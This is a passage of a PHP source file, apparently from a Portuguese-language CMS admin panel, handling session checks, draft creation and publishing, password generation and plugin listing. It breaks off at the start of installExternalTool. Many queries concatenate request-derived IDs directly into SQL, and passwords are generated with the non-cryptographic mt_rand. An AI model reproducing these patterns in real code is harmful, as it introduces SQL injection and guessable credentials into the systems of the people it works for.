<?ob_start();
if( !defined( '__DIR__' ) )define( '__DIR__', dirname(__FILE__) );
if (mysqli_connect_errno()) {printf("Connect failed: %s\n", mysqli_connect_error());exit();}
set_time_limit(0);


function verifyUserLogin($return=false){
		if(	
			SECURE==TRUE 
			&&
			((empty($_COOKIE['ws_session'])|| empty($_COOKIE['ws_log'])|| empty($_COOKIE['_WS_']) || empty($_SESSION['ws_log']) || empty($_SESSION['user']))
			||
			($_COOKIE['ws_log']!=true || $_SESSION['ws_log'] !=1 || $_SESSION['user']['ativo']!=1 ))
		){
			session_regenerate_id(true);
			session_start(); 
			$_SESSION=array();
			unset($_SESSION);
			session_unset();
			session_destroy();
			session_write_close();
			flush();
			if($return==true){ 
				return false;
			}else{
				echo '<script>
						document.cookie.split(";").forEach(function(c) {document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");}); 
						if(window.location.pathname=="/admin/"){
							window.top.location.reload();
						}else{
							window.top.location = "/admin/";
						}
				</script>';
			}
		}else{
			if($return==true){ 
				return true;
			}
		}


}
function aplicaRascunho($ws_id_ferramenta,$id_item,$apenasAplica=false){
		global $_conectMySQLi_;
		if($apenasAplica==true){goto apenasAplica;}
		##########################################################################################################
		# SEPARA OS CAMPOS UTILIZADOS NA FERRAMENTA
		##########################################################################################################
			$campos							= new MySQL();
			$campos->set_table(PREFIX_TABLES.'_model_campos');
			$campos->set_order(	"posicao","ASC");
			$campos->set_where(	'ws_id_ferramenta="'.$ws_id_ferramenta.'"');
			$campos->select();

		##########################################################################################################
		# SELECIONA O RASCUNHO A SER APLICADO
		##########################################################################################################
			$get_draft				= new MySQL();
			$get_draft->set_table(PREFIX_TABLES."_model_item");
			$get_draft->set_where('ws_draft="1"');
			$get_draft->set_where('AND ws_id_draft="'.$id_item.'"');
			$get_draft->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
			$get_draft->select();
			if($get_draft->_num_rows==0){
				die('Não existe rascunho cadastrado deste ítem');
			}
			$rascunho = $get_draft->fetch_array[0];
		##########################################################################################################
		# ABRE OS DADOS DO ÍTEM A SER ALTERADO
		##########################################################################################################
			$Set_Item				= new MySQL();
			$Set_Item->set_table(PREFIX_TABLES.'_model_item');
			$Set_Item->set_where(PREFIX_TABLES.'_model_item.id="'.$id_item.'"');

		##########################################################################################################
		# ADICIONA OS REGISTROS NOS CAMPOS ADICIONADOS DA FERRAMENTA
		##########################################################################################################
			foreach ($campos->fetch_array as $value) {
				if($value['coluna_mysql']!=""){
					$rascunhoSave = mysqli_real_escape_string($_conectMySQLi_,urldecode($rascunho[$value['coluna_mysql']]));
					$Set_Item->set_update($value['coluna_mysql'], $rascunhoSave);
				}
			}
			if($Set_Item->salvar()){
				apenasAplica:
				##########################################################################################################
				# EXCLUI O RASCUNHO DO ÍTEM
				##########################################################################################################
					$get_draft				= new MySQL();
					$get_draft->set_table(PREFIX_TABLES."_model_item");
					$get_draft->set_where('ws_draft="1"');
					$get_draft->set_where('AND ws_id_draft="'.$id_item.'"');
					$get_draft->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$get_draft->exclui();

				##########################################################################################################
				# EXCLUI OS REGISTROS DAS IMAGENS DO ÍTEM ORIGINAL
				##########################################################################################################
					$ExclIMGs				= new MySQL();
					$ExclIMGs->set_table(PREFIX_TABLES."_model_img");
					$ExclIMGs->set_where('ws_draft="0"');
					$ExclIMGs->set_where('AND ws_id_draft="0"');
					$ExclIMGs->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$ExclIMGs->set_where('AND id_item="'.$id_item.'"');
					if($apenasAplica==true){
						$ApenasAplicaQuery = new MySQL();
						$ApenasAplicaQuery->select("SELECT COUNT(*) as count FROM ".PREFIX_TABLES."_model_img where(ws_draft='1' AND ws_id_ferramenta='".$ws_id_ferramenta."' AND id_item='".$id_item."')");
						$ExclIMGs->set_where('AND '.$ApenasAplicaQuery->obj[0]->count.'>0');
					}
					$ExclIMGs->exclui();

				##########################################################################################################
				# AGORA HABILITA COMO ORIGINAL OS REGISTROS DO RASCUNHO
				##########################################################################################################
					$Set_img				= new MySQL();
					$Set_img->set_table(PREFIX_TABLES.'_model_img');
					$Set_img->set_where('ws_draft="1" AND ws_id_draft="'.$id_item.'"');
					$Set_img->set_update("ws_draft","0");
					$Set_img->set_update("ws_id_draft","0");
					$Set_img->salvar();

				##########################################################################################################
				# EXCLUI AS GALERIAS ORIGINAIS
				##########################################################################################################
					$ExclGal = new MySQL();
					$ExclGal->set_table(PREFIX_TABLES.'_model_gal');
					$ExclGal->set_where('ws_draft="0"');
					$ExclGal->set_where('AND ws_id_draft="0"');
					$ExclGal->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$ExclGal->set_where('AND id_item="'.$id_item.'"');
					if($apenasAplica==true){
						$ApenasAplicaQuery = new MySQL();
						$ApenasAplicaQuery->select("SELECT COUNT(*) as contador FROM ".PREFIX_TABLES."_model_gal where(ws_draft='1' AND ws_id_ferramenta='".$ws_id_ferramenta."' AND id_item='".$id_item."' AND ws_id_draft='".$id_item."')");
						$ExclGal->set_where('AND '.$ApenasAplicaQuery->obj[0]->contador.'>0');
					}				
					$ExclGal->exclui();

				##########################################################################################################
				# APLICANDO AS GALERIAS DE FOTOS
				##########################################################################################################
					$Set_img = new MySQL();
					$Set_img->set_table(PREFIX_TABLES.'_model_gal');
					$Set_img->set_where('ws_draft="1" AND ws_id_draft="'.$id_item.'"');
					$Set_img->set_update("ws_draft","0");
					$Set_img->set_update("ws_id_draft","0");
					$Set_img->salvar();

				##########################################################################################################
				# EXCLUI AS IMAGENS DAS GALERIAS ORIGINAIS
				##########################################################################################################
					$ExclGal = new MySQL();
					$ExclGal->set_table(PREFIX_TABLES.'_model_img_gal');
					$ExclGal->set_where('ws_draft="0" AND ws_id_draft="0" AND ws_id_ferramenta="'.$ws_id_ferramenta.'" AND id_item="'.$id_item.'"');
					if($apenasAplica==true){
						$ApenasAplicaQuery = new MySQL();
						$ApenasAplicaQuery->select("SELECT COUNT(*) as contador FROM ".PREFIX_TABLES."_model_img_gal where(ws_draft='1' AND ws_id_ferramenta='".$ws_id_ferramenta."' AND id_item='".$id_item."' AND ws_id_draft='".$id_item."')");
						$ExclGal->set_where('AND '.$ApenasAplicaQuery->obj[0]->contador.'>0');
					}
					$ExclGal->exclui();

				##########################################################################################################
				# APLICANDO AS IMAGENS NAS GALERIAS DE FOTOS
				##########################################################################################################
					$Set_img = new MySQL();
					$Set_img->set_table(PREFIX_TABLES.'_model_img_gal');
					$Set_img->set_where('ws_draft="1" AND ws_id_draft="'.$id_item.'"');
					$Set_img->set_update("ws_draft","0");
					$Set_img->set_update("ws_id_draft","0");
					$Set_img->salvar();

				##########################################################################################################
				# EXCLUI OS REGISTROS DOS ARQUIVOS DO ÍTEM ORIGINAL
				##########################################################################################################
					$ExclFiles				= new MySQL();
					$ExclFiles->set_table(PREFIX_TABLES."_model_files");
					$ExclFiles->set_where('ws_draft="0"');
					$ExclFiles->set_where('AND ws_id_draft="0"');
					$ExclFiles->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$ExclFiles->set_where('AND id_item="'.$id_item.'"');
					if($apenasAplica==true){						
						$ApenasAplicaQuery = new MySQL();
						$ApenasAplicaQuery->select("SELECT COUNT(*) as contador FROM ".PREFIX_TABLES."_model_files where(ws_draft='1' AND ws_id_ferramenta='".$ws_id_ferramenta."' AND id_item='".$id_item."' AND ws_id_draft='".$id_item."')");
						$ExclFiles->set_where('AND '.$ApenasAplicaQuery->obj[0]->contador.'>0');
					}
					$ExclFiles->exclui();

				##########################################################################################################
				# AGORA HABILITA COMO ORIGINAL OS REGISTROS DO RASCUNHO
				##########################################################################################################
					$Set_files				= new MySQL();
					$Set_files->set_table(PREFIX_TABLES.'_model_files');
					$Set_files->set_where('ws_draft="1" AND ws_id_draft="'.$id_item.'"');
					$Set_files->set_update("ws_draft","0");
					$Set_files->set_update("ws_id_draft","0");
					$Set_files->salvar();

				##########################################################################################################
				# EXCLUI OS REGISTROS DOS RELACIONAMENTOS ORIGINAIS
				##########################################################################################################
					$ExclLink				= new MySQL();
					$ExclLink->set_table(PREFIX_TABLES."_model_link_prod_cat");
					$ExclLink->set_where(' ws_draft="0" ');
					$ExclLink->set_where('AND ws_id_draft="0" ');
					$ExclLink->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$ExclLink->set_where('AND id_item="'.$id_item.'"');
					$ExclLink->exclui();

				##########################################################################################################
				# AGORA HABILITA COMO ORIGINAL OS RASCUNHOS
				##########################################################################################################
					$Set_Link				= new MySQL();
					$Set_Link->set_table(PREFIX_TABLES.'_model_link_prod_cat');
					$Set_Link->set_where('ws_draft="1" AND ws_id_draft="'.$id_item.'"');
					$Set_Link->set_where('AND id_item="'.$id_item.'"');
					$Set_Link->set_update("ws_draft","0");
					$Set_Link->set_update("ws_id_draft","0");
					$Set_Link->salvar();
					
				##########################################################################################################
				# EXCLUI OS REGISTROS DOS RELACIONAMENTOS ORIGINAIS
				##########################################################################################################
					$ExclLink				= new MySQL();
					$ExclLink->set_table(PREFIX_TABLES."ws_link_itens");
					$ExclLink->set_where(' ws_draft="0"  AND ws_id_draft="0"  AND id_item="'.$id_item.'"');
					$ExclLink->exclui();

				##########################################################################################################
				# AGORA HABILITA COMO ORIGINAL OS RASCUNHOS
				##########################################################################################################
					$Set_Link				= new MySQL();
					$Set_Link->set_table(PREFIX_TABLES.'ws_link_itens');
					$Set_Link->set_where('ws_draft="1" AND ws_id_draft="'.$id_item.'" AND id_item="'.$id_item.'"');
					$Set_Link->set_update("ws_draft","0");
					$Set_Link->set_update("ws_id_draft","0");
					$Set_Link->salvar();

				##########################################################################################################
				# END
				##########################################################################################################
			};

		return true;
}
function criaRascunho($ws_id_ferramenta=0,$id_item=null, $imagens=false){
		global $_conectMySQLi_;
		##########################################################################################################
		# VERIFICA SE JÁ TEM RASCUNHO
		##########################################################################################################
			$draft				= new MySQL();
			$draft->set_table(PREFIX_TABLES."_model_item");
			$draft->set_where('ws_draft="1"');
			$draft->set_where('AND ws_id_draft="'.$id_item.'"');
			$draft->select();
		##########################################################################################################
		# VERIFICA SE É´PARA GERAR APENAS RASCUNHOS DAS IMAGENS E ARQUIVOS INTERNOS
		##########################################################################################################
		if($imagens==true){goto imagens;}
		##########################################################################################################
		# CASO NÃO TENHA CRIA UM RASCUNHO, CLONAMOS O ORIGINAL PARA O RASCUNHO 
		##########################################################################################################
			if($draft->_num_rows==0){
				##########################################################################################################
				# SEPARA O ÍTEM ORIGINAL
				##########################################################################################################
					$get_produto	= new MySQL();
					$get_produto->set_table(PREFIX_TABLES.'_model_item');
					$get_produto->set_where(PREFIX_TABLES.'_model_item.id="'.$id_item.'"');
					$get_produto->select();
				##########################################################################################################
				# INICIA A CÓPIA
				##########################################################################################################
					$Set_Draft	= new MySQL();
					$Set_Draft->set_table(PREFIX_TABLES.'_model_item');
					$Set_Draft->set_insert('ws_draft','1');
					$Set_Draft->set_insert('ws_id_draft',$id_item);
					$Set_Draft->set_insert('ws_id_ferramenta',$ws_id_ferramenta);
					$Set_Draft->set_insert('token', $get_produto->fetch_array[0]['token']);
				##########################################################################################################
				# SEPARAMOS OS CAMPOS DESTE ÍTEM
				##########################################################################################################
					$campos							= new MySQL();
					$campos->set_table(PREFIX_TABLES.'_model_campos');
					$campos->set_order(	"posicao","ASC");
					$campos->set_where(	'ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$campos->select();
					foreach ($campos->fetch_array as $value) {
						if($value['coluna_mysql']!=""){
							$Set_Draft->set_insert($value['coluna_mysql'], mysqli_real_escape_string($_conectMySQLi_,urldecode($get_produto->fetch_array[0][$value['coluna_mysql']])));
						}
					}
					$Set_Draft->insert();

				imagens:
				##########################################################################################################
				# GERA RASCUNHO DAS IMAGENS DIRETAS
				##########################################################################################################
					$getIMGs				= new MySQL();
					$getIMGs->set_table(PREFIX_TABLES."_model_img");
					$getIMGs->set_where('ws_draft="0"');
					$getIMGs->set_where('AND ws_id_draft="0"');
					$getIMGs->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$getIMGs->set_where('AND id_item="'.$id_item.'"');
					$getIMGs->select();
					$draftIMG				= new MySQL();
					$draftIMG->set_table(PREFIX_TABLES."_model_img");
					$draftIMG->set_where('ws_draft="1"');
					$draftIMG->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$draftIMG->set_where('AND ws_id_draft="'.$id_item.'"');
					$draftIMG->select();
					//CASO NÃO TENHA RASCUNHO AINDA
					if($draftIMG->_num_rows<1 && $getIMGs->_num_rows>0){
						foreach ($getIMGs->fetch_array as $valueImg) {
							$Set_DraftIMG	= new MySQL();
							$Set_DraftIMG->set_table(PREFIX_TABLES.'_model_img');
							$Set_DraftIMG->set_insert('ws_draft',			'1');
							$Set_DraftIMG->set_insert('ws_id_draft',		$id_item);
							$Set_DraftIMG->set_insert('ws_type',			$valueImg['ws_type']);
							$Set_DraftIMG->set_insert('avatar',				$valueImg['avatar']);
							$Set_DraftIMG->set_insert('ws_id_ferramenta',	$ws_id_ferramenta);
							$Set_DraftIMG->set_insert('ws_tool_item',		$valueImg['ws_tool_item']);
							$Set_DraftIMG->set_insert('id_item',			$id_item);
							$Set_DraftIMG->set_insert('id_cat',				$valueImg['id_cat']);
							$Set_DraftIMG->set_insert('ws_nivel',			$valueImg['ws_nivel']);
							$Set_DraftIMG->set_insert('posicao',			$valueImg['posicao']);
							$Set_DraftIMG->set_insert('painel',				$valueImg['painel']);
							$Set_DraftIMG->set_insert('titulo',				$valueImg['titulo']);
							$Set_DraftIMG->set_insert('url',				$valueImg['url']);
							$Set_DraftIMG->set_insert('texto',				$valueImg['texto']);
							$Set_DraftIMG->set_insert('imagem',				$valueImg['imagem']);
							$Set_DraftIMG->set_insert('filename',			$valueImg['filename']);
							$Set_DraftIMG->set_insert('token',				$valueImg['token']);
							$Set_DraftIMG->insert();
						}
					}
				##########################################################################################################
				# GERA RASCUNHO DAS GALERIAS E SUAS IMAGENS
				##########################################################################################################
					##########################################################################################################
					# GERA RASCUNHO DAS GALERIAS E SUAS IMAGENS
					##########################################################################################################
						$draftGals				= new MySQL();
						$draftGals->set_table(PREFIX_TABLES."_model_gal");
						$draftGals->set_where('ws_draft="1"');
						$draftGals->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
						$draftGals->set_where('AND ws_id_draft="'.$id_item.'"');
						$draftGals->select();
						$getGALS				= new MySQL();
						$getGALS->set_table(PREFIX_TABLES."_model_gal");
						$getGALS->set_where('ws_draft="0"');
						$getGALS->set_where('AND ws_id_draft="0"');
						$getGALS->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
						$getGALS->set_where('AND id_item="'.$id_item.'"');
						$getGALS->select();

						if($draftGals->_num_rows<1 && $getGALS->_num_rows>0){
							foreach ($getGALS->fetch_array as $valueGal){
								##########################################################################################################
								# CLONA A GALERIA DO LOOP
								##########################################################################################################
									$Set_DraftGal	= new MySQL();
									$Set_DraftGal->set_table(PREFIX_TABLES.'_model_gal');
									$Set_DraftGal->set_insert('ws_id_draft',		$id_item);
									$Set_DraftGal->set_insert('ws_draft',			'1');
									$Set_DraftGal->set_insert('ws_type',			$valueGal['ws_type']);
									$Set_DraftGal->set_insert('ws_id_ferramenta',	$ws_id_ferramenta);
									$Set_DraftGal->set_insert('ws_tool_id',			$id_item);
									$Set_DraftGal->set_insert('ws_tool_item',		$id_item);
									$Set_DraftGal->set_insert('ws_nivel',			$valueGal['ws_nivel']);
									$Set_DraftGal->set_insert('id_cat',				$valueGal['id_cat']);
									$Set_DraftGal->set_insert('id_item',			$id_item);
									$Set_DraftGal->set_insert('posicao',			$valueGal['posicao']);
									$Set_DraftGal->set_insert('avatar',				$valueGal['avatar']);
									$Set_DraftGal->set_insert('filename',			$valueGal['filename']);
									$Set_DraftGal->set_insert('titulo',				$valueGal['titulo']);
									$Set_DraftGal->set_insert('token',				$valueGal['token']);
									$Set_DraftGal->set_insert('texto',				$valueGal['texto']);
									$Set_DraftGal->set_insert('url	',				$valueGal['url']);
									$Set_DraftGal->insert();
								##########################################################################################################
								# PEGA O ID DA GALERIA ADICIONADA
								##########################################################################################################
									$CloneGal	= new MySQL();
									$CloneGal->set_table(PREFIX_TABLES.'_model_gal');
									$CloneGal->set_order('id','DESC');
									$CloneGal->set_colum('id');
									$CloneGal->set_limit(1);
									$CloneGal->select();
									$idCloneGal = $CloneGal->fetch_array[0]['id'];
								##########################################################################################################
								# SELECIONA AS IMAGENS DESSA GALERIA
								##########################################################################################################
									$imgGaleria				= new MySQL();
									$imgGaleria->set_table(PREFIX_TABLES."_model_img_gal");
									$imgGaleria->set_where('id_galeria="'.$value['id'].'"');
									$imgGaleria->select();							
								##########################################################################################################
								# AGORA CLONA OS REGISTROS DAS IMAGENS DA GALERIA ORIGINAL COM A REFERENCIA DESSA GALERIA CLONADA
								##########################################################################################################
									foreach ($imgGaleria->fetch_array as $imgVal){
										$Set_Draft_img_Gal	= new MySQL();
										$Set_Draft_img_Gal->set_table(PREFIX_TABLES.'_model_img_gal');
										$Set_Draft_img_Gal->set_insert('ws_draft',			'1');
										$Set_Draft_img_Gal->set_insert('ws_id_draft',		$id_item);
										$Set_Draft_img_Gal->set_insert('id_galeria',		$idCloneGal);//ID DA GALERIA CLONADA
										$Set_Draft_img_Gal->set_insert('ws_type',			$imgVal['ws_type']);
										$Set_Draft_img_Gal->set_insert('ws_id_ferramenta',	$ws_id_ferramenta);
										$Set_Draft_img_Gal->set_insert('ws_tool_id',		$imgVal['ws_tool_id']);
										$Set_Draft_img_Gal->set_insert('ws_tool_item',		$imgVal['ws_tool_item']);
										$Set_Draft_img_Gal->set_insert('id_item',			$id_item);
										$Set_Draft_img_Gal->set_insert('id_cat',			$imgVal['id_cat']);
										$Set_Draft_img_Gal->set_insert('posicao',			$imgVal['posicao']);
										$Set_Draft_img_Gal->set_insert('ws_nivel',			$imgVal['ws_nivel']);
										$Set_Draft_img_Gal->set_insert('titulo',			$imgVal['titulo']);
										$Set_Draft_img_Gal->set_insert('url',				$imgVal['url']);
										$Set_Draft_img_Gal->set_insert('texto',				$imgVal['texto']);
										$Set_Draft_img_Gal->set_insert('imagem',			$imgVal['imagem']);
										$Set_Draft_img_Gal->set_insert('filename',			$imgVal['filename']);
										$Set_Draft_img_Gal->set_insert('file',				$imgVal['file']);
										$Set_Draft_img_Gal->set_insert('avatar',			$imgVal['avatar']);
										$Set_Draft_img_Gal->set_insert('token',				$imgVal['token']);
										$Set_Draft_img_Gal->insert();
									}
							}
						}
					##########################################################################################################
					# GERA RASCUNHO DOS ARQUIVOS
					##########################################################################################################
						$getFiles				= new MySQL();
						$getFiles->set_table(PREFIX_TABLES."_model_files");
						$getFiles->set_where('ws_draft="0"');
						$getFiles->set_where('AND ws_id_draft="0"');
						$getFiles->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
						$getFiles->set_where('AND id_item="'.$id_item.'"');
						$getFiles->select();

						$draftFiles				= new MySQL();
						$draftFiles->set_table(PREFIX_TABLES."_model_files");
						$draftFiles->set_where('ws_draft="1"');
						$draftFiles->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
						$draftFiles->set_where('AND ws_id_draft="'.$id_item.'"');
						$draftFiles->set_where('AND id_item="'.$id_item.'"');
						$draftFiles->select();
						//CASO NÃO TENHA RASCUNHO AINDA E TENHA ARQUIVOS NO ORIGINAL
						if($draftFiles->_num_rows<1 && $getFiles->_num_rows>0){
							foreach ($getFiles->fetch_array as $valueFile) {
								$Set_DraftFiles	= new MySQL();
								$Set_DraftFiles->set_table(PREFIX_TABLES.'_model_files');
								$Set_DraftFiles->set_insert('ws_id_draft',		$id_item);
								$Set_DraftFiles->set_insert('ws_draft',			'1');
								$Set_DraftFiles->set_insert('ws_type',			$valueFile['ws_type']);
								$Set_DraftFiles->set_insert('ws_id_ferramenta',	$ws_id_ferramenta);
								$Set_DraftFiles->set_insert('ws_tool_id',		$valueFile['ws_tool_id']);
								$Set_DraftFiles->set_insert('ws_tool_item',		$valueFile['ws_tool_item']);
								$Set_DraftFiles->set_insert('id_item',			$id_item);
								$Set_DraftFiles->set_insert('id_cat',			$valueFile['id_cat']);
								$Set_DraftFiles->set_insert('ws_nivel',			$valueFile['ws_nivel']);
								$Set_DraftFiles->set_insert('posicao',			$valueFile['posicao']);
								$Set_DraftFiles->set_insert('uploaded',			$valueFile['uploaded']);
								$Set_DraftFiles->set_insert('titulo',			$valueFile['titulo']);
								$Set_DraftFiles->set_insert('painel',			$valueFile['painel']);
								$Set_DraftFiles->set_insert('url',				$valueFile['url']);
								$Set_DraftFiles->set_insert('texto',			$valueFile['texto']);
								$Set_DraftFiles->set_insert('file',				$valueFile['file']);
								$Set_DraftFiles->set_insert('filename',			$valueFile['filename']);
								$Set_DraftFiles->set_insert('token',			$valueFile['token']);
								$Set_DraftFiles->set_insert('size_file',		$valueFile['size_file']);
								$Set_DraftFiles->set_insert('download',			$valueFile['download']);
								$Set_DraftFiles->insert();
							}
						}
				##########################################################################################################
				# GERA RASCUNHO DO RELACIONAMENTO DE CATEGORIAS
				##########################################################################################################
					$getCat				= new MySQL();
					$getCat->set_table(PREFIX_TABLES."_model_link_prod_cat");
					$getCat->set_where('ws_draft="0"');
					$getCat->set_where('AND ws_id_draft="0"');
					$getCat->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$getCat->set_where('AND id_item="'.$id_item.'"');
					$getCat->select();

					$draftLink				= new MySQL();
					$draftLink->set_table(PREFIX_TABLES."_model_link_prod_cat");
					$draftLink->set_where('ws_draft="1"');
					$draftLink->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$draftLink->set_where('AND ws_id_draft="'.$id_item.'"');
					$draftLink->set_where('AND id_item="'.$id_item.'"');
					$draftLink->select();
					//CASO NÃO TENHA RASCUNHO E TENHA CATEGORIAS NO ORIGINAL
					if($draftLink->_num_rows<1 && $getCat->_num_rows>0){
						foreach ($getCat->fetch_array as $valueCat) {
							$Set_Cat	= new MySQL();
							$Set_Cat->set_table(PREFIX_TABLES.'_model_link_prod_cat');
							$Set_Cat->set_insert('ws_id_draft',		$id_item);
							$Set_Cat->set_insert('ws_draft',		'1');
							$Set_Cat->set_insert('id_cat',			$valueCat['id_cat']);
							$Set_Cat->set_insert('ws_id_ferramenta',$ws_id_ferramenta);
							$Set_Cat->set_insert('id_item',		$valueCat['id_item']);
							$Set_Cat->set_insert('ws_tool_id',		$valueCat['ws_tool_id']);
							$Set_Cat->set_insert('ws_tool_item',	$id_item);
							$Set_Cat->set_insert('ws_nivel',		$valueCat['ws_nivel']);
							$Set_Cat->insert();
						}
					}
				##########################################################################################################
				# GERA RASCUNHO DO RELACIONAMENTO ENTRE ITENS
				##########################################################################################################
					$getLinkProd				= new MySQL();
					$getLinkProd->set_table(PREFIX_TABLES."ws_link_itens");
					$getLinkProd->set_where('ws_draft="0"');
					$getLinkProd->set_where('AND ws_id_draft="0"');
					$getLinkProd->set_where('AND id_item="'.$id_item.'"');
					$getLinkProd->select();
					$draftLinkProd				= new MySQL();
					$draftLinkProd->set_table(PREFIX_TABLES."ws_link_itens");
					$draftLinkProd->set_where('ws_draft="1"');
					$draftLinkProd->set_where('AND ws_id_draft="'.$id_item.'"');
					$draftLinkProd->set_where('AND id_item="'.$id_item.'"');
					$draftLinkProd->select();
					//CASO NÃO TENHA RASCUNHO E TENHA CATEGORIAS NO ORIGINAL
					if($draftLinkProd->_num_rows<1 && $getLinkProd->_num_rows>0){
						foreach ($getLinkProd->fetch_array as $valueCat) {
							$Set_Cat	= new MySQL();
							$Set_Cat->set_table(PREFIX_TABLES.'ws_link_itens');
							$Set_Cat->set_insert('ws_id_draft',		$id_item);
							$Set_Cat->set_insert('ws_draft',		'1');
							$Set_Cat->set_insert('id_item',			$valueCat['id_item']);
							$Set_Cat->set_insert('id_item_link',	$valueCat['id_item_link']);
							$Set_Cat->set_insert('id_cat_link',		$valueCat['id_cat_link']);
							$Set_Cat->insert();
						}
					}

				##########################################################################################################
				# GERA RASCUNHO DOS ARQUIVOS DIRETOS
				##########################################################################################################

					$getFILES 				= new MySQL();
					$getFILES->set_table(PREFIX_TABLES."_model_files");
					$getFILES->set_where('ws_draft="0"');
					$getFILES->set_where('AND ws_id_draft="0"');
					$getFILES->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$getFILES->set_where('AND id_item="'.$id_item.'"');
					$getFILES->select();

					$draftFILES				= new MySQL();
					$draftFILES->set_table(PREFIX_TABLES."_model_files");
					$draftFILES->set_where('ws_draft="1"');
					$draftFILES->set_where('AND ws_id_ferramenta="'.$ws_id_ferramenta.'"');
					$draftFILES->set_where('AND ws_id_draft="'.$id_item.'"');
					$draftFILES->select();

					//CASO NÃO TENHA RASCUNHO AINDA
					if($draftFILES->_num_rows<1 && $getFILES->_num_rows>0){
						foreach ($getFILES->fetch_array as $valueFile) {
							$Set_DraftIMG	= new MySQL();
							$Set_DraftIMG->set_table(PREFIX_TABLES.'_model_files');
							$Set_DraftIMG->set_insert('ws_draft',			'1');
							$Set_DraftIMG->set_insert('ws_id_draft',		$id_item);
							$Set_DraftIMG->set_insert('id_item',			$id_item);
							$Set_DraftIMG->set_insert('ws_id_ferramenta',	$ws_id_ferramenta);
							$Set_DraftIMG->set_insert('ws_type',			$valueFile['ws_type']);
							$Set_DraftIMG->set_insert('ws_tool_id',			$valueFile['ws_tool_id']);
							$Set_DraftIMG->set_insert('ws_tool_item',		$valueFile['ws_tool_item']);
							$Set_DraftIMG->set_insert('id_cat',				$valueFile['id_cat']);
							$Set_DraftIMG->set_insert('ws_nivel',			$valueFile['ws_nivel']);
							$Set_DraftIMG->set_insert('posicao',			$valueFile['posicao']);
							$Set_DraftIMG->set_insert('titulo',				$valueFile['titulo']);
							$Set_DraftIMG->set_insert('painel',				$valueFile['painel']);
							$Set_DraftIMG->set_insert('url',				$valueFile['url']);
							$Set_DraftIMG->set_insert('texto',				$valueFile['texto']);
							$Set_DraftIMG->set_insert('file',				$valueFile['file']);
							$Set_DraftIMG->set_insert('filename',			$valueFile['filename']);
							$Set_DraftIMG->set_insert('token',				$valueFile['token']);
							$Set_DraftIMG->set_insert('size_file',			$valueFile['size_file']);
							$Set_DraftIMG->set_insert('download',			$valueFile['download']);
							$Set_DraftIMG->set_insert('uploaded',			$valueFile['uploaded']);
							$Set_DraftIMG->insert();
						}
					}

				############################################### END ######################################################
				return true;
			}

		##########################################################################################################
		# FIM (apenas se ñ tiover rascunho do ítem)
		##########################################################################################################
}

function createPass($tamanho = 8, $maiusculas = true, $numeros = true, $simbolos = false){
	$lmin = 'abcdefghijklmnopqrstuvwxyz';
	$lmai = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$num  = '1234567890';
	$simb = '!@#$%*-';
	$retorno = '';
	$caracteres = '';
	$caracteres .= $lmin;
	if ($maiusculas) $caracteres .= $lmai;
	if ($numeros) $caracteres .= $num;
	if ($simbolos) $caracteres .= $simb;
	$len = strlen($caracteres);
	for ($n = 1; $n <= $tamanho; $n++) {
		$rand = mt_rand(1, $len);
		$retorno .= $caracteres[$rand-1];
	}
	return $retorno;
}

##########################################################################################################
# FUNÇÃO QUE CRIA O JSON COM A LISTA DOS PLUGINS INSTALADOS
##########################################################################################################

function refreshJsonPluginsList(){
	$setupdata 	= new MySQL();
	$setupdata->set_table(PREFIX_TABLES.'setupdata');
	$setupdata->set_order('id','DESC');
	$setupdata->set_limit(1);
	$setupdata->debug(0);
	$setupdata->select();
	$setupdata = $setupdata->fetch_array[0];
	//################################################################################################
	$_path_plugin_ = ROOT_WEBSITE.'/'.$setupdata['url_plugin']; 
	$json_plugins = array();
	if(is_dir($_path_plugin_)){
		$dh = opendir($_path_plugin_);
		while($diretorio = readdir($dh)){
			if($diretorio != '..' && $diretorio != '.' && $diretorio != '.htaccess' ){
				$phpConfig 	= $_path_plugin_.'/'.$diretorio.'/plugin.config.php';
				if(file_exists($phpConfig)){
					ob_start();
					@include($phpConfig);
					$jsonRanderizado=ob_get_clean();
					$contents=$plugin;
				}
				$itemArray = Array();
				if(file_exists($_path_plugin_.'/'.$diretorio.'/active')){
					@$contents->{'active'}="yes";
				}else{
					@$contents->{'active'}="no";
				}
				$contents->{'realPath'}=str_replace(ROOT_WEBSITE,'',$_path_plugin_).'/'.$diretorio;
				//################################################################################################
				$json_plugins[] = $contents;
			}
		}
	}
	file_put_contents(ROOT_ADMIN.'/App/Templates/json/ws-plugin-list.json', json_encode($json_plugins,JSON_UNESCAPED_UNICODE|JSON_PRETTY_PRINT));
}
function print_pre($str){
	echo "<pre>";
	print_r($str);
	echo "</pre>";
}
function json_decode_nice($json, $assoc = TRUE){
    $json = str_replace("\n","\\n",$json);
    $json = str_replace("\r","",$json);
    $json = preg_replace('/([{,]+)(\s*)([^"]+?)\s*:/','$1"$3":',$json);
    $json = preg_replace('/(,)\s*}$/','}',$json);
    return json_decode($json,$assoc);
}
function CopiaDir($DirFont, $DirDest){
	if(!file_exists($DirDest)){mkdir($DirDest); }
    if ($dd = opendir($DirFont)) {
        while (false !== ($Arq = readdir($dd))) {
            if($Arq != "." && $Arq != ".."){
                $PathIn = "$DirFont/$Arq";
                $PathOut = "$DirDest/$Arq";
                if(is_dir($PathIn)){
                    CopiaDir($PathIn, $PathOut);
                }elseif(is_file($PathIn)){
                    copy($PathIn, $PathOut);
                }
            }
        }
        closedir($dd);
    }
}
function installExternalTool($webtool=null,$grupoPai=null){

